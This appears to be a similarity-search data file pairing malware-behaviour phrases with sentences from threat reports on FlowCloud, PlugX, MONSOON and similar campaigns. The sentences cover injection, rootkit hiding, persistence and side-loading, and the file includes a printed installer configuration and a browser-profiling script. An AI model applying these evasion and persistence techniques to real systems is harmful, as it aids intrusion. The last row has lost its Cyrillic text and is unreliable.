The next stage, injected into iexplore.exe|0.7713997774839967|['The malware was compiled on 24 th November 2015 and it is a 32-bit DLL.', 'This shows that the sample is recent and indicates the threat actor is currently active.', 'Examining the PE structure of Syncmgr.dll shows a hidden executable embedded as one of the resources: Figure 7: Executable embedded in resource.', 'Once SyncManager.dll is executed, an iexplore.exe process is spawned: Figure 8: A malicious iexplore.exe process spawned.', 'Unsurprisingly, the strings of the iexplore.exe process reveals that the malware has injected itself into the process.', 'Figure 9: Malware injected into iexplore.exe.', 'By visualising the ProcessMonitor logs in ProcDOT, we see that two more files are created by the malware: WEB2013BW6.DAT and 60HGBC00.DAT.Figure 10: Malware creates two addition .DAT files.', 'By comparing the code constructs between the embedded resource ASDASDASDASDSAD and WEB2013BW6.DAT, we see that they contain the identical code, as shown below: Figure 11: The embedded resource (left) and WEB2013BW6.DAT have similar code constructs.', 'However, WEB2013BW6.DAT is over 500MB in size which is significantly larger than ASDASDASDASDSAD which is only 51KB in size: Figure 12: Dropped files in AppData\\\\Roaming\\\\Programs folder.', 'An examination into the PE structure of WEB2013BW6.DAT shows that a significant amount of junk characters are appended to the foot of the file: Figure 13: Padding towards the end of WEB2013BW6.DAT.', 'Based on its contents, the .DAT file is likely a component responsible for network communication.']
The injected code loads the same backdoor (rescure.dat) into the process’s memory and calls its startModule export to finish the installation.|0.9295781624644182|['On Windows 10 machines, the system time is briefly changed to make it look like the service was created in January 2013.', 'Both this and the use of the legitimate driver directory help the rootkit blend in with other drivers.', 'The following files are copied to the %System% directory: The backdoor: rescure.dat A decoy DLL: sspisrvui.dat as sspisrvui.dll (timestomped to July 2013) The encrypted shellcode: rebare.dat The rebare.dat shellcode is very similar to that used in the self-decrypting DLL, but it loads fcClient directly.', 'FlowCloud then starts a suspended process to perform injection on it.', 'This process is created via CreateProcessAsUserW using a token retrieved from the explorer.exe or winlogon.exe process in the current session.', 'The injected code loads the same backdoor (rescure.dat) into the processs memory and calls its startModule export to finish the installation.', 'Meanwhile, the injection process is terminated.', '11/26At this point, installation of the backdoor is complete.', 'All that is left is to execute the backdoor.', 'To achieve this, the new process loads the decoy DLL and manually replaces its content in memory with the fcClientDll module (a process known as module stomping or DLL hollowing), before calling its main function.', 'fcClientDll (responsor.dat) This complex module is the main component of the backdoor.']
the injection process|0.8187280981229277|"['Threat actors can add or remove features according to their malicious intentions.', ""Employing Cobalt Strike beacons in the attacks' infection chain allows the attackers to blend their malicious traffic with legitimate traffic and evade network detections."", 'Also, with its capabilities to configure commands in the beacon configuration, the attacker can perform various malicious operations such as injecting other malicious binary into the running processes of the infected machines and can avoid having a separate injection module implants in their infection chain.', 'The Cobalt Strike beacon configurations of this campaign showed us various characteristics of the beacon binary: C2 server.', 'Communication protocols.', 'Process injection techniques.', 'Malleable C2 Instructions.', 'Target process to spawn for x86 and x64 processes.', 'Watermark : ""Xi54kA=="".', '7/10Cobalt Strike beacon configuration sample.', 'The Cobalt Strike beacon used in this campaign has the following capabilities: Executes arbitrary codes in the target processes through process injection.']"
perform process injection to masquerade as harmless processes.|0.7618918136675107|['Information Masquerading: The driver component of FlowCloud masquerades as a T1036.004Masquerade Task or mouse driver service.', 'Service Masquerading: Match Files named after legitimate utilities are written into the T1036.005Legitimate Name or %ProgramFiles%\\\\MSBuild\\\\Microsoft\\\\Expression\\\\Blend\\\\msole\\\\ Location subdirectory.', 'FlowCloud uses a rootkit to hide its network traffic and T1014 Rootkit processes from system utilities.', 'Process Injection: FlowCloud uses both regular and reflective DLL injection.', 'It T1055.001Dynamic-link Library also manually loads some DLLs, bypassing calls to Injection LoadLibrary.', 'TA410s backdoors perform process injection to masquerade T1055 Process Injection as harmless processes.', 'Process Injection: One of FlowClouds DLLs replaces instructions in the loading Defense T1055.003Thread Execution process to make it execute code written in its memory.', 'Evasion Hijacking Process Injection: FlowCloud uses module stomping to hide the loading of its T1055.012 Process Hollowing main backdoor.', 'Deobfuscate/Decode Multiple TA410 backdoors communicate with their C&C T1140 Files or Information through encrypted and obfuscated channels.', 'Hijack Execution FlowCloud uses DLL Side-Loading to launch its second-stage T1574.002Flow: DLL Side- dropper.', 'Loading Virtualization/SandboxSome versions of FlowCloud use the Pafish utility to detect T1497 Evasion virtualization, sandboxes, and debuggers.']
The module creates a new process using the same executable and performs process injection on it, redirecting the existing thread to the written code region.|1.0|['1for (int i=0; i < ciphertext_length; i++) 2 plaintext[i] = ((encrypted[i] ^ key) + key) & 0xFF Figure 16.', 'Pseudocode for the DLL decryption routine This newly loaded module uses the same anti-debugging and anti-analysis techniques as the hijacking DLL described above.', 'On top of those, it also uses a few tricks of its own: Covers its tracks by overwriting the code previously modified by the malicious library with a useless call to lstrlenW.', 'Base64-encoded strings are used for function imports (via GetProcAddress) and only decoded as needed.', 'Exits if the processs executable is not the expected DLL hijacking target (e.g., setlang.exe).', 'The module creates a new process using the same executable and performs process injection on it, redirecting the existing thread to the written code region.', 'This code inside the new process launches a thread that decrypts and loads the fcClient module before calling its startModule export.', 'That function will perform the final stages of the installation and load the DLL containing the backdoor functionality.', 'Driver (hidmouse.sys) FlowClouds driver serves a dual purpose: it acts as both a keylogger and a rootkit.', 'It accomplishes this mainly by hijacking native drivers handler functions for specific I/O control codes and replacing them with its own: Read (IRP_MJ_READ) for the keyboard driver (kbdclass or KeyboardClass0) Read (IRP_MJ_READ) for the mouse driver (mouclass or PointerClass0) Device control (IRP_MJ_DEVICE_CONTROL) for the network driver (tcpip or nsiproxy) The driver also provides kernel-level functionalities to be used by the RAT.', 'They can be invoked via IO control codes or by writing to specific registry keys.']
The loader injects an orchestrator into memory in a svchost.exe process.|0.8277118656769606|['TA410 LookingFrog LookingFrog uses two main malware families: X4 and LookBack.', 'We have seen both of them on machines belonging to the same victim.', 'X4 X4 is a custom backdoor that is used as a first stage, before LookBack is deployed.', 'It is loaded by a VMProtect-ed loader, usually named PortableDeviceApi.dll or WptsExtensions.dll.', 'Unfortunately, we were not able to uncover any persistence method.', '18/26The loader injects an orchestrator into memory in a svchost.exe process.', 'In turn, the orchestrator injects the network component into memory and communicates with it via a file located at C:\\\\ProgramData\\\\Microsoft\\\\Crypto\\\\RSA\\\\MachineKeys\\\\Log\\\\rsa.txt.', 'Figure 18 shows a summary of the X4 components.', 'Figure 18.', 'Summary of the X4 components The network component is shellcode.', 'It is encrypted using the AES algorithm and stored in the Windows registry.']
Persistence for the downloaded payload is established via the Tendyron value under the Run key HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run.|0.8647745250714022|[']93:1702/okt.dat written to %localappdata%\\\\Tendyron\\\\OnKeyToken_KEB.dll (SHA1: F359D3C074135BBCA9A4C98A6B6544690EDAE93D) http://103.139.2[.', ']93:1702/md.dat written to %localappdata%\\\\Tendyron\\\\Tendyron.conf (we were not able to retrieve this file) Finally, this process separately downloads http://103.139.2[.', ']93:1702/t86.dat (resource 101), loads it into memory, and calls its startModule export.', 'Unfortunately, we were not able to retrieve this sample.', 'Tendyron.exe is a legitimate executable, signed by online-banking security vendor Tendyron Corporation, and that is vulnerable to DLL search-order hijacking.', 'Persistence for the downloaded payload is established via the Tendyron 4/26value under the Run key HKCU\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run.', 'When executed, Tendyron.exe loads the malicious OnKeyToken_KEB.dll.', 'The export OnKeyT_ContextInit contains code that decrypts hardcoded shellcode (see Figure 4) and injects it into iexplore.exe using WriteProcessMemory.', 'Figure 4.', 'Shellcode decryption loop The next stage, injected into iexplore.exe, is a backdoor written using the Microsoft Foundation Class (MFC) framework.', 'It also contains RTTI symbols and thus a few C++ class names: ClientSocket Manager DllManager KernelManager These class names are the same as used in Farfli/Gh0stRAT, a backdoor that has been used for more than 10 years to conduct (mostly) cyberespionage operations.']
the task or service attains persistence by being set to start automatically on boot|0.9209086498780527|['Note that some fields are commented out.', 'The configuration can also contain a section defining specific security software to check for, but this isnt implemented in the loaders we analyzed.', 'However, there is a custom AntivirusCheck class, which can check running processes against a hardcoded list of XOR-encrypted executable filenames from known security products: 360 Total Security, Avast, Avira, AVG, Bitdefender, ESET, Jiangmin Technology Antivirus, Kingsoft, McAfee, Micropoint, Norton, Rising Antivirus, and Trend Micro.', 'This class is only used if the loader is set to directly start the fcClient module via the auto_start_after_install configuration key.', 'Depending on the configuration keys used, the loader can either load the fcClientDll RAT module directly, thus bypassing most of the complex deployment process, or it can create a service or scheduled task.', 'In the former case, the task or service attains persistence by being set to start automatically on boot.', 'In the samples we observed, the task or service was configured to execute the next step of the installation process by running a legitimate application vulnerable to DLL search-order hijacking.', 'The application and the accompanying relevant and malicious DLL were both embedded in the loaders resources.', 'DLL side-loading (XXXModule_dlcore0) In the samples we analyzed, the vulnerable application was either setlang.exe from Microsoft Office 2003 with a malicious setlangloc.dll or vpreview.exe from Visio Preview 2007 with a malicious vviewres.dll.', 'Strings contained in the malicious DLL also point to emedres.dll from Emurasofts EmEditor as a possible third target for DLL side-loading.', 'This is a real possibility as such vulnerabilities were present in older versions of EmEditor, but we did not see any samples using it.']
the task or service attains persistence by being set to start automatically on boot|0.9209086498780527|"[""Figure 8 shows this installation configuration with the comments translated into English.#Product name, these will be used in the configuration generator and applied to the front end [product] product_chs_name=Sky Arrow product_name=PCArrowI product_version=v5.0.2  [general] created_folder=:\\\\Program Files\\\\MSBuild\\\\Microsoft\\\\Expression\\\\Blend\\\\msole install_folder=:\\\\Program Files\\\\MSBuild\\\\Microsoft\\\\Expression\\\\Blend\\\\msole data_folder=:\\\\Program Files\\\\MSBuild\\\\Microsoft\\\\Expression\\\\Blend\\\\msole\\\\fcdata  hide_user_activity_tab = 0  #File path, not including drive letter [file] 100=:\\\\Program Files\\\\MSBuild\\\\Microsoft\\\\Expression\\\\Blend\\\\msole\\\\responsor.dat 103=:\\\\Program Files\\\\MSBuild\\\\Microsoft\\\\Expression\\\\Blend\\\\msole\\\\setlang.exe 104=:\\\\Program Files\\\\MSBuild\\\\Microsoft\\\\Expression\\\\Blend\\\\msole\\\\setlangloc.dat #105=:\\\\Program Files\\\\MSBuild\\\\Microsoft\\\\Expression\\\\Blend\\\\msole\\\\rebare.dat 106=:\\\\Program Files\\\\MSBuild\\\\Microsoft\\\\Expression\\\\Blend\\\\msole\\\\rescure.dat 107=:\\\\Program Files\\\\MSBuild\\\\Microsoft\\\\Expression\\\\Blend\\\\msole\\\\rescure86.dat 108=:\\\\Program Files\\\\MSBuild\\\\Microsoft\\\\Expression\\\\Blend\\\\msole\\\\rescure64.dat 109=:\\\\Program Files\\\\MSBuild\\\\Microsoft\\\\Expression\\\\Blend\\\\msole\\\\sspisrvui.dat 110=:\\\\Program Files\\\\MSBuild\\\\Microsoft\\\\Expression\\\\Blend\\\\msole\\\\setlangloc.dll 101=:\\\\Program Files\\\\MSBuild\\\\Microsoft\\\\Expression\\\\Blend\\\\msole\\\\E86F36C4 102=:\\\\Program Files\\\\MSBuild\\\\Microsoft\\\\Expression\\\\Blend\\\\msole\\\\AC146142 1000=:\\\\Program Files\\\\MSBuild\\\\Microsoft\\\\Expression\\\\Blend\\\\msole\\\\E19D9D4B  #0x0001 Release without decryption #0x0002 Decryption release [file_out_type] 100=0x0001 103=0x0002 104=0x0002 #105=0x0002 106=0x0002 107=0x0002 108=0x0002 109=0x0002 110=0x0002 101=0x0001 102=0x0001 1000=0x0001  ##Registry path: separated by'|', respectively representing HKEY_LOCAL_MACHINE, path name, value name [key] ##100=0x80000002|SYSTEM\\\\Setup\\\\PrintResponsor|1 #101=0x80000002|SYSTEM\\\\Setup\\\\PrintResponsor|2 #102=0x80000002|SYSTEM\\\\Setup\\\\PrintResponsor|3 #1000=0x80000002|SYSTEM\\\\Setup\\\\PrintResponsor|4 ##2000=0x80000002|SYSTEM\\\\Setup\\\\AllowStart\\\\ceipCommon|1 ##2001=0x80000002|SYSTEM\\\\Setup\\\\AllowStart\\\\ceipCommon|2 2001=0x80000002|SYSTEM\\\\Setup\\\\AllowStart\\\\ceipCommon|1  ##0x0001 Release without decryption ##0x0002 Decryption release [key_out_type] ##100=0x0001 #101=0x0001 #102=0x0001 #1000=0x0001 #2000=0x0002 2001=0x0002  #Service Information: hhw.exe needs to be dynamically generated [service_attribute] is_hhw=0 service_name=PrintResponsor service_path=%ProgramFiles%\\\\MSBuild\\\\Microsoft\\\\Expression\\\\Blend\\\\msole\\\\setlang.exe service_parm=Figure 8."", 'Installation configuration with explanatory comments.', 'Note that some fields are commented out.The configuration can also contain a section defining specific security software to check for, but this isnt implemented in the loaders we analyzed.', 'However, there is a customAntivirusCheckclass, which can check running processes against a hardcoded list of XOR-encrypted executable filenames from known security products: 360 Total Security, Avast, Avira, AVG, Bitdefender, ESET, Jiangmin Technology Antivirus, Kingsoft, McAfee, Micropoint, Norton, Rising Antivirus, and Trend Micro.', 'This class is only used if the loader is set to directly start thefcClientmodule via theauto_start_after_installconfiguration key.Depending on the configuration keys used, the loader can either load thefcClientDllRAT module directly, thus bypassing most of the complex deployment process, or it can create a service or scheduled task.', 'In the former case, the task or service attains persistence by being set to start automatically on boot.', 'In the samples we observed, the task or service was configured to execute the next step of the installation process by running a legitimate application vulnerable to DLL search-order hijacking.', 'The application and the accompanying relevant and malicious DLL were both embedded in the loaders resources.DLL side-loading (XXXModule_dlcore0)In the samples we analyzed, the vulnerable application was eithersetlang.exefrom Microsoft Office 2003 with a malicioussetlangloc.dllorvpreview.exefrom Visio Preview 2007 with a maliciousvviewres.dll.', 'Strings contained in the malicious DLL also point toemedres.dllfrom Emurasofts EmEditor as a possible third target for DLL side-loading.', 'This is a real possibility as such vulnerabilities were present in older versions of EmEditor, but we did not see any samples using it.In all observed samples, the malicious library is the same and serves to load and execute shellcode from a file that is stored under the same name as the DLL, but with a.datextension.', 'We analyze this shellcode in the next section, but first, we want to look at the notable anti-analysis techniques used in this library.Despite its relatively simple goals, the librarys code makes heavy use of anti-debugging tricks and control flow obfuscation to hinder analysis.']"
It then sets specific registry keys and files as guardrails to skip the setup on subsequent runs.|1.0000000000000002|['The second one raises an exception via the INT 0x2D instruction and exits if it was handled by a debugger.', 'Figure 10.', 'Decompiler view showing the obvious pattern of anti-debugging checks.', 'Note that we had to remove the aforementioned obfuscation for the decompiler to produce any output.', 'fcClient (rescure.dat) When it is first executed, this module sets up persistence and installs the backdoor, rootkit, and persistence modules.', 'It then sets specific registry keys and files as guardrails to skip the setup on subsequent runs.', 'First, persistence is established by using the ITaskService COM interface to create the \\\\Microsoft\\\\Windows\\\\CertificateServicesClient\\\\NetTask scheduled task.', 'If a task with the same name already exists, it is deleted before the new one is created.', 'This task will run the DLL hijacking target as SYSTEM at each boot.', 'Afterwards, the rootkit module is decrypted and written to the %System%\\\\drivers folder as hidmouse.sys.', 'A hidmouse service is then created to run that module and is immediately started.']
uses filenames that are either similar to those of legitimate Windows files (e.g., rebare.dll which could be mistaken for rebar.dll) or innocuous looking (e.g., AC146142) to avoid suspicion.|0.9687472499351312|[]
named after legitimate utilities are written into the %ProgramFiles%\MSBuild\Microsoft\Expression\Blend\msole\ subdirectory.|0.7891342207619034|[]
This process is further camouflaged by changing its associated executable filename to one of svchost.exe or dllhost.exe in the same kernel structure.|1.0000000000000002|['As shown in Figure 17, it achieves this by removing their entries from the ActiveProcessLinks list of the undocumented KPROCESS kernel structure.', 'Since this structure is not part of the public API and can change between releases, the rootkit contains code to match the operating systems build number to the correct offsets in this structure.', 'That code covers all versions from Windows XP to Windows 10 20H1.', 'This functionality can be invoked on any process via the IOCTL_HIDE_PROCESS_BY_PROCESSID (0x222028) control code.', 'It is also used, on driver startup, to hide the process with the PID contained in the registry key HKLM\\\\HARDWARE\\\\{76BA14B7-AF0C-4dc9-9E9D-2A6970F231D9}.', 'This process is further camouflaged by changing its associated executable filename to one of svchost.exe or dllhost.exe in the same kernel structure.', '17/26Figure 17.', 'Function used to prevent a process from being displayed in lists of running processes Through its hijacking of the network driver, the rootkit can also hide a single processs network traffic from local utilities.', 'The process whose traffic is to be hidden is set through the IOCTL_SET_TRAFFICHIDE_PROCESSID (0x222048) control code.', 'Some of the rootkits functions are used by the fcClientDll module to hide the process in which it is running.', 'Control codes to manipulate a process name in various internal structures are also exposed by the driver.']
it can create a service|0.750085004013575|['query Dump information about a service.', 'start Start a service.', 'stop Stop a service.', 'pause Pause a service.', 'continue Make a paused service resume execution.', 'create Create a new service.', 'config Change configuration for a service.', 'delete Delete a service.', 'desc Change the description of a service.', 'To get help for a specific command use: %s {command} -h sinfo System information sinfo Usage: sinfo [-a] For any inquiries, contact intelreports@kaspersky.com Page 18 of 33The ProjectSauron APT.', 'Technical analysis -a Show volume information for all drives (removable, network etc).']
it can create a service|0.830521364416616|['P2P PlugX introduced several new features which surely made attackers to manage their attack infrastructure efficiently.', 'We are sure that PlugX will keep evolving, and continuous analysis will be necessary for preventing/mitigating possible incident.', 'We will keep you updated on any new findings.', 'Thank you very much for reading.', '- Shusei Tomonaga (For any inquiry or incident report regarding PlugX, please contact info[at]jpcert.or.jp) Appendix A: Entire Configuration of P2P PlugX Table 3: Entire Configuration of P2P PlugX Offset Length Description 0x0000 20 Not used 0x0014 4 Flag if remove own DLL from list of modules 0x0018 4 Flag enable/disable key logger 0x001c 12 Not used0x0028 4 Duration of suspend activity 0x002c 4 Duration of suspend activity 0x0030 672 Network Access Flag (for a week with 15min interval) 0x02d0 4 * 4 DNS Server IP Address x 4 0x02e0 68 * 16 control Server Information x 16 0x0720 128 * 16 HTTP Access URL x 16 0x0f20 196 * 4 Proxy/authentication config x 4 0x1230 4 Method to make it resident (e.g.', 'Create Service.', 'Create Run Key) 0x1234 512 Folder to Install 0x1434 512 Service Name 0x1634 512 Service Display Name 0x1834 512 Service Description 0x1a34 4 Registry Root Key Value for Run Registry Key Configuration 0x1a38 512 Run Registry Key Name 0x1c38 512 Run Registry Key Value 0x1e38 4 Enable/Disable Code injection 0x1e3c 512 * 4 Program Name for Code Injection x 4 0x263c 4 Enable/Disable Code injection for UAC Bypass 0x2640 512 * 4 Program Name to inject code for UAC Bypass x 4 0x2e40 512 Authentication Character String for PlugX 0x3040 512 Authentication Character String for C&C Server 0x3240 512 Mutex Name 0x3440 4 Enable/Disable Screen Capture 0x3444 4 * 5 Screen Capture Configuration Value 0x3458 528 Folder to Store Screen Captures 0x3658 4 Enable/Disable P2P(TCP) 0x365c 4 P2P(TCP) Port Number 0x3660 4 Enable/Disable P2P(UDP) 0x3664 4 P2P(UDP) Port Number 0x3668 4 Enable/Disable P2P(ICMP) 0x366c 4 P2P(ICMP) Port Number 0x3670 4 Enable/Disable P2P(IP Protocol Number 255) 0x3674 4 P2P(IP Protocol Number 255) Port Number 0x3678 4 Enable/Disable P2P Scanning 0x367c 4 * 4 P2P Scanning Beginning Address x 4 0x368c 4 * 4 P2P Scanning End Address x 4 0x369c 6 Run program if this MAC Address is used 0x36a2 2 Not used Appendix B: SHA-256 hash value of P2P PlugXbc65e2859f243ff45b12cd184bfed7b809f74e67e5bb61bc92ed94058d3d2515 93c85a8dd0becc4e396eea2dc15c0010ff58d2b873d44fd7e45711a27cfe613b 0ff134057a8b2e31b148fedfdd185f5b1a512149499a8c5c0915cf10b10a613e']
service is then created|0.8394641150676894|"['It does not maintain exports and simply delivers another encrypted library maintained in its resource section.', 'This second library performs all the espionage functionality.', ""When running on Windows 7, the malicious library uses the Metasploit Framework's open-source code Win7Elevate to inject malicious code into explorer.exe."", ""In any case, be it Windows 7 or not, this malicious code decrypts its spying library from resources, saves it to disk with an apparently random but hardcoded name, for example, ~DFE8B437DD7C417A6D.TMP, in the user's temporary folder and loads this file as library."", 'This next stage library copies itself into the System32 directory of the Windows folder after the hardcoded file name -- either KBDLV2.DLL or AUTO.DLL, depending on the malware sample.', 'Then the service is created for the service dll.', 'Service names also can differ from version to version; we discovered the following names -- DriverManage, WebService and WebClientManager.', 'These functions assure malwarepersistence in a compromised OS between system reboots.', 'At this stage, the malware gathers information about the infected computer.', 'This includes an output of the systeminfo command saved in the file oledvbs.inc by following the hardcoded path: C:Program FilesCommon FilesSystemOle DBoledvbs.inc.', ""There is another function called - the malware creates a string containing computer and user names but this isn't used anywhere.""]"
service is then created|0.8394641150676894|['Among the organizations we counted, 11 are based in South Korea and two entities reside in China.Partly because this campaign is very limited and highly targeted, we have not yet been able to identify how this malware is being distributed.', 'The malicious samples we found are the early stage malware most often delivered by spear-phishing e-mails.Infecting a systemThe initial Trojan dropper is a Dynamic Link Library functioning as a loader for further malware.', 'It does not maintain exports and simply delivers another encrypted library maintained in its resource section.', 'This second library performs all the espionage functionality.When running on Windows 7, the malicious library uses the Metasploit Frameworks open-source code Win7Elevate to inject malicious code intoexplorer.exe.', 'In any case, be it Windows 7 or not, this malicious code decrypts its spying library from resources, saves it to disk with an apparently random but hardcoded name, for example,~DFE8B437DD7C417A6D.TMP, in the users temporary folder and loads this file as library.This next stage library copies itself into theSystem32directory of the Windows folder after the hardcoded file name eitherKBDLV2.DLL or AUTO.DLL, depending on the malware sample.', 'Then the service is created for the service dll.', 'Service names also can differ from version to version; we discovered the following names DriverManage, WebServiceandWebClientManager.', 'These functions assure malware persistence in a compromised OS between system reboots.At this stage, the malware gathers information about the infected computer.', 'This includes an output of thesysteminfocommand saved in the fileoledvbs.incby following the hardcoded path:C:Program FilesCommon FilesSystemOle DBoledvbs.inc.', 'There is another function called the malware creates a string containing computer and user names but this isnt used anywhere.', 'By all appearances, this is a mistake by the malware author.']
persistence is established by using the ITaskService COM interface to create the \Microsoft\Windows\CertificateServicesClient\NetTask scheduled task|0.9879894871449656|['Figure 10.', 'Decompiler view showing the obvious pattern of anti-debugging checks.', 'Note that we had to remove the aforementioned obfuscation for the decompiler to produce any output.', 'fcClient (rescure.dat) When it is first executed, this module sets up persistence and installs the backdoor, rootkit, and persistence modules.', 'It then sets specific registry keys and files as guardrails to skip the setup on subsequent runs.', 'First, persistence is established by using the ITaskService COM interface to create the \\\\Microsoft\\\\Windows\\\\CertificateServicesClient\\\\NetTask scheduled task.', 'If a task with the same name already exists, it is deleted before the new one is created.', 'This task will run the DLL hijacking target as SYSTEM at each boot.', 'Afterwards, the rootkit module is decrypted and written to the %System%\\\\drivers folder as hidmouse.sys.', 'A hidmouse service is then created to run that module and is immediately started.', 'The file is then deleted from the disk and replaced by a copy of the legitimate hidusb.sys driver from the same folder.']
This task will run the DLL hijacking target as SYSTEM at each boot.|1.0|['Note that we had to remove the aforementioned obfuscation for the decompiler to produce any output.', 'fcClient (rescure.dat) When it is first executed, this module sets up persistence and installs the backdoor, rootkit, and persistence modules.', 'It then sets specific registry keys and files as guardrails to skip the setup on subsequent runs.', 'First, persistence is established by using the ITaskService COM interface to create the \\\\Microsoft\\\\Windows\\\\CertificateServicesClient\\\\NetTask scheduled task.', 'If a task with the same name already exists, it is deleted before the new one is created.', 'This task will run the DLL hijacking target as SYSTEM at each boot.', 'Afterwards, the rootkit module is decrypted and written to the %System%\\\\drivers folder as hidmouse.sys.', 'A hidmouse service is then created to run that module and is immediately started.', 'The file is then deleted from the disk and replaced by a copy of the legitimate hidusb.sys driver from the same folder.', 'Thus, anyone looking at the file on disk rather than the one mapped into memory would see a legitimate, benign file.', 'On Windows 10 machines, the system time is briefly changed to make it look like the service was created in January 2013.']
creates a scheduled task for persistence.|0.8200822937173379|['Pgina 7 de 11RESEARCH_ Docless Vietnam APT -A technique still alive- The code contains Bai.doc in base64, which is the decoy document.', 'And uses scheduled tasks to persist, checking if the victim has privileges.', 'This file checks if the user is administrator.', 'If so, it copies the DLL file in WINDIR\\\\debug\\\\ and %TEMP% otherwise.', 'If administrator, it will create a scheduled task with SYSTEM privileges, if not, it will try without so high privileges Aside, this file is in charge of persistence.', 'It creates a scheduled task.', 'It is quite interesting that the malware checks if Kaspersky (avp.exe process) is running in the system and acts differently if so.', 'If Kaspersky IS in the system, it will create a scheduled task that runs a vbs script, as usual.', 'But if Kaspersky is NOT present in the system, it will rename the vbs to TXT and run wbscript with the parameter /E:vbscript that allows the program to know what kind of script it is running.', 'We guess this is trying to bypass the detection tin some way, although it sounds counterintuitive.', 'The final stage, uninstalling yourself The system runs the DLL with InstallUtil.exe, to avoid Smartscreen and Applocker.']
service is then created to run that module and is immediately started|0.7734354879494708|['It then sets specific registry keys and files as guardrails to skip the setup on subsequent runs.', 'First, persistence is established by using the ITaskService COM interface to create the \\\\Microsoft\\\\Windows\\\\CertificateServicesClient\\\\NetTask scheduled task.', 'If a task with the same name already exists, it is deleted before the new one is created.', 'This task will run the DLL hijacking target as SYSTEM at each boot.', 'Afterwards, the rootkit module is decrypted and written to the %System%\\\\drivers folder as hidmouse.sys.', 'A hidmouse service is then created to run that module and is immediately started.', 'The file is then deleted from the disk and replaced by a copy of the legitimate hidusb.sys driver from the same folder.', 'Thus, anyone looking at the file on disk rather than the one mapped into memory would see a legitimate, benign file.', 'On Windows 10 machines, the system time is briefly changed to make it look like the service was created in January 2013.', 'Both this and the use of the legitimate driver directory help the rootkit blend in with other drivers.', 'The following files are copied to the %System% directory: The backdoor: rescure.dat A decoy DLL: sspisrvui.dat as sspisrvui.dll (timestomped to July 2013) The encrypted shellcode: rebare.dat The rebare.dat shellcode is very similar to that used in the self-decrypting DLL, but it loads fcClient directly.']
target for DLL side-loading|0.8837385661323723|['We also found some known malware families such as PlugX and HyperBro, as well as many custom post-exploitation tools.', 'Below we describe the loading, persistence, and features of the two backdoors.', 'Type 1 Backdoor Loading the Payload This backdoor is written in the C++ language with classes that inherit from virtual classes.', 'The backdoor is also modular, allowing for expansion with the use of plugins.', 'Current Method: DLL Side-Loading To load this backdoor, the threat actor launches the legitimate file MsMpEng.exe, which is signed by Microsoft and described as an Antimalware Service Executable.', 'This executable is vulnerable to DLL side-loading,3 wherein an unintended DLL is loaded on a program.', 'In this case, the malicious actor takes advantage of it by storing a file named mpsvc.dll in the same directory.', 'That DLL then opens a third filename, mpsvc.mui, which contains the obfuscated backdoor, decodes it, and loads it into a svchost.exe process.', 'We found two RAR archive files (detected as Trojan.Win64.CLAMBLING.A) in the wild containing the aforementioned files.', 'The modification time of the embedded files is 2019-07-25.', 'Old Method: Patching of a Legitimate File Interestingly, we observed a different technique being used in an older version of this backdoor.']
target for DLL side-loading|0.8837385661323723|"['No further content was served from lite.php during the investigation.', 'A likely scenario is that the attackers may have wanted to use a Silverlight exploit to execute the malware in the case of a user who does not open or get successfully exploited by the weaponised document.', 'This could have been intended as an exploitation of something like CVE-2016-0034 which is known to have been adopted by exploit kits back in February 2016 and which pre-dates MONSOON.', ""HTTP/1.1 200 OK Date: Fri, 27 May 2016 22:32:29 GMT Server: Apache X-Powered-By: PHP/5.5.12 Content-Length: 749 Keep-Alive: timeout=5, max=100 Connection: Keep-Alive Content-Type: text/html <script>function hasSilverlightPlugin() { var slplugin = false; var browser = navigator.appName; // Get the browser type if (browser == 'Microsoft Internet Explorer') { try { var slControl = new ActiveXObject('AgControl.AgControl'); if (slControl) { slplugin = true; } } catch (e) { } } else { // Netscape, FireFox, Google chrome etc try { if (navigator.plugins['Silverlight Plug-In']) { slplugin = true; } } catch (e) { } } return slplugin; } var javascriptVariable = hasSilverlightPlugin(); window.location.href = 'lite.php?name='+javascriptVariable; </script> Figure 19 Silverlight Profiling MONSOON ANALYSIS OF AN APT CAMPAIGN Revision: 1.07 | TLP-WHITE | 21/57Forcepoint Security Labs | Special Investigations BADNEWS MALWARE The BADNEWS malware is capable of arbitrary command execution, screenshots, self-updating, downloading and executing files, and directory listings."", 'The name was given due to its use of RSS feeds, forums, blogs and Dynamic DNS providers for its C&C infrastructure.', 'BADNEWS uses a DLL side-loading technique with a signed Java binary in order to evade security solutions.', 'It is a first stage malware that is likely to receive second stage malware components if the target is of interest, although we did not observe this behaviour.', 'DLL Side-Loading.', 'The BADNEWS DLL is typically side-loaded into a legitimate signed Java executable.', ""A specific weaponised document analysed10 drops a binary blob and an encoded VBScript file which then extracts a decoy document along with the following 3 files: MicroScMgmt.exe msvcr71.dll jli.dll MicroScMgmt.exe is a renamed version of the legitimate Java Runtime's 6.0.390.4 binary named java- rmi.exe and is signed by Sun Microsystems."", 'This application requires the legitimate msvcr71.dll and also requires a DLL named jli.dll.']"
target for DLL side-loading|0.8837385661323723|"[']ua"", ,    .', ', , 08.11.2022  .', 'RAR- ""shahed-136.rar"",  PPSX- ""shahed.ppsx"", ,  , VBScript-,   ,  ,   PowerShell-.', ',    RC4,   ,    ""Manager""  ("" |shahed.ppsx"").', 'PowerShell-  BitsTransfer (Background Intelligent Transfer Management)   ""WibuCm32.dll"", ""CodeMeter.exe"" ( ),    .', ',  DLL Side-Loading.', '""WibuCm32.dll""   DolphinCape,    Delphi     (\' , \' , , ,  ), EXE/DLL ,   ,    .', 'UAC-0140.', ': 247997c2b4431585f9355d3324410298 460244cbf353b15b52c69952dd3b2549de79c590c56807bc25d4896dd0016655 shahed- 136.rar 241e4285a84be65cf16778462f06b9a8 5137a888271b08f388d863433e5f0f1b129e15d4c812b95c831e93e27ec45bd6 1/3shahed.ppsx 3444e86aefa7bc2dbce34903f805400d 6ee62645cd97fb0b41fdf219b9a2a8211324ded110b5c7f09b3d9881abb2a594 SearchEmbdIndex.ps1 142893c48b76b7e9d0f7ce74e16aaf1f 2c1a2fe3fb418601f3adc9256e1ff2c509178483fdbb0e964f52fb6b30be1129 CodeMeter.exe 98c3d5347842743bfb4ade50b39226c1 772654b186ad9fbd0a80f03ceae7d327b45c8944452cc39048160b1f6d8f2672 WibuCm32.dll (2022-09-24 06:09:32) (DolphinCape) : morgunov.a@dsns.com.ua 195[.', ']123.237.147 202[.', ']157.187.190 Mozilla/3.0 (compatible; Indy Library) dsns.com[.']"
